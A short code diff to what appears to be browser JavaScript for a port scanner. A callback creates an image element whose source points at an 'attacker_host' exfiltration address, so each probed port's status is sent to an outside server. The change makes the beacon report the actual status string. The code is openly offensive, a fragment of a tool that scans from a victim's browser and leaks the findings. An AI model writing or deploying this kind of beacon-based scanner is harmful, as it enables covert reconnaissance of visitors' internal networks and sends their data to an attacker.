@@ -1,6 +1,6 @@
 var call_back = function (port, status, exfil_host=attacker_host) {
 	let img = document.createElement("img");
-        img.src = `${exfil_host}/port-${port}-openned`
+        img.src = `${exfil_host}/port-${port}-${status}`
 }
 
 var check_port = function (target, port, timeout, callback=call_back) {
